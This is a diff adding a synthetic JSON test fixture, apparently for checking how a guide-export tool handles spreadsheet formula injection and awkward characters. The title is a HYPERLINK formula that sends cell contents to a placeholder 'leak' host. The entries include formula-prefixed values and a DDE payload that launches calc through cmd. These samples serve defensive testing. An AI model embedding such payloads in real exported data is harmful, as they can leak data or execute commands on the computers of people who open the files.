@@ -1,0 +1,23 @@
+{
+  "schema_version": "0.1.0",
+  "profile": "cnsi-core",
+  "synthetic": true,
+  "guide_id": "urn:uuid:5e1d0c3a-0000-4000-8000-00000000f0e1",
+  "revision_id": "inject-1",
+  "title": "=HYPERLINK(\"https://example.invalid/?leak=\"&A1,\"SYNTHETIC title injection\")",
+  "lifecycle": { "state": "draft" },
+  "document_markings": { "classification": "U", "banner": "UNCLASSIFIED — SYNTHETIC & TEST" },
+  "entries": [
+    { "entry_id": "eq", "kind": "element", "description": "=1+1", "level": "U" },
+    { "entry_id": "plus", "kind": "element", "description": "+1+1", "level": "U" },
+    { "entry_id": "minus", "kind": "element", "description": "-1+1", "level": "U" },
+    { "entry_id": "at", "kind": "element", "description": "@SUM(1,1)", "level": "U" },
+    { "entry_id": "tab", "kind": "element", "description": "\t=1+1", "level": "U" },
+    { "entry_id": "cr", "kind": "element", "description": "\r=1+1", "level": "U" },
+    { "entry_id": "dde", "kind": "element", "description": "=cmd|' /C calc'!A0", "level": "U" },
+    { "entry_id": "crlf", "kind": "element", "description": "Line one\r\nLine two  ", "level": "U" },
+    { "entry_id": "spaces", "kind": "element", "description": "  leading and trailing spaces  ", "level": "U" },
+    { "entry_id": "ctrl", "kind": "element", "description": "Control char \u0007 bell and _x0041_ literal", "level": "U" },
+    { "entry_id": "num", "kind": "element", "description": "00123", "level": "U", "notes": "1.4E+5" }
+  ]
+}
